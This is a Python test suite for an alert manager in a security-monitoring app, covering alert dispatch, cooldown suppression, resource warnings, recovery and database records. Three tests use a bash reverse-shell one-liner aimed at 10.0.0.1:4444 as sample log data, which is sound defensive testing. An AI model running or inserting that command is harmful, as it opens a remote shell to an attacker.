"""
test_alerts.py
==============
Unit and integration test suite for app/alert_manager.py.
Tests:
- Centralized Alert Dispatching across Security, DDoS, Resource, and Health alerts
- Alert Cooldown & Duplicate Email Suppression
- Active Alert State Tracking & RECOVERY notifications
- Database Alert Persistence & Resolution
"""

import sys
import os
import time
sys.path.insert(0, os.getcwd())

from app.alert_manager import AlertManager
from app.database import db

import app.config as config
config.ALERT_COOLDOWN_SECONDS = 3

def run_tests():
    print("=" * 70)
    print("🧪 RUNNING ALERT MANAGER SUITE (test_alerts.py)")
    print("=" * 70)

    # Instantiate isolated alert manager with short 3-second cooldown for testing
    am = AlertManager(cooldown_seconds=3)

    # 1. Test Initial Alert Dispatch
    print("\n[Test 1] Testing Initial Alert Dispatch...")
    sent1 = am.dispatch_security_attack(
        prediction="ReverseShell",
        confidence=0.95,
        risk="CRITICAL",
        source_log="/var/log/syslog_test_alerts",
        raw_log="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
    )
    print(f"   Initial Alert Dispatch Sent: {sent1}")
    assert sent1, "First security alert should be sent"

    # 2. Test Cooldown / Duplicate Suppression
    print("\n[Test 2] Testing Cooldown & Duplicate Alert Suppression...")
    sent2 = am.dispatch_security_attack(
        prediction="ReverseShell",
        confidence=0.95,
        risk="CRITICAL",
        source_log="/var/log/syslog_test_alerts",
        raw_log="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
    )
    print(f"   Duplicate Alert Dispatch Result: {sent2} (Expected False due to cooldown)")
    assert not sent2, "Duplicate alert within cooldown window MUST be suppressed"
    print("   ✅ Passed: Duplicate alert within cooldown window suppressed.")

    # 3. Test Cooldown Expiration
    print("\n[Test 3] Testing Cooldown Expiration (Waiting 3.5 seconds)...")
    time.sleep(3.5)
    sent3 = am.dispatch_security_attack(
        prediction="ReverseShell",
        confidence=0.95,
        risk="CRITICAL",
        source_log="/var/log/syslog_test_alerts",
        raw_log="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
    )
    print(f"   Post-Cooldown Alert Dispatch Result: {sent3}")
    assert sent3, "Alert post-cooldown should be dispatched"
    print("   ✅ Passed: Alert successfully dispatched after cooldown expiration.")

    # 4. Test Resource Warning & Recovery Dispatch
    print("\n[Test 4] Testing Resource Warning & Recovery Dispatch...")
    metrics_sample = {"cpu_percent": 88.0, "ram_percent": 65.0, "disk_percent": 70.0}

    # Dispatch CPU_HIGH warning
    res_warning = am.dispatch_resource_alert(
        metric_name="CPU",
        severity="WARNING",
        alert_type_name="CPU_HIGH",
        current_val=88.0,
        threshold_val=80.0,
        metrics=metrics_sample
    )
    assert am.active_resource_states["CPU"] == "WARNING", "CPU state should be WARNING"
    print("   ✅ Passed: Resource WARNING alert dispatched and state recorded as WARNING.")

    # Dispatch Recovery
    res_recovery = am.dispatch_recovery_alert(
        metric_name="CPU",
        current_val=45.0,
        metrics={"cpu_percent": 45.0}
    )
    assert am.active_resource_states["CPU"] == "NORMAL", "CPU state should return to NORMAL"
    print("   ✅ Passed: Resource RECOVERY alert dispatched and state restored to NORMAL.")

    # 5. Verify Database Records
    print("\n[Test 5] Checking Database Active & Historical Alerts...")
    active_alerts = db.get_active_alerts()
    print(f"   Active Alerts in DB: {len(active_alerts)}")

    print("\n" + "=" * 70)
    print("✅ ALL ALERT MANAGER TESTS PASSED SUCCESSFULLY!")
    print("=" * 70)

if __name__ == "__main__":
    run_tests()
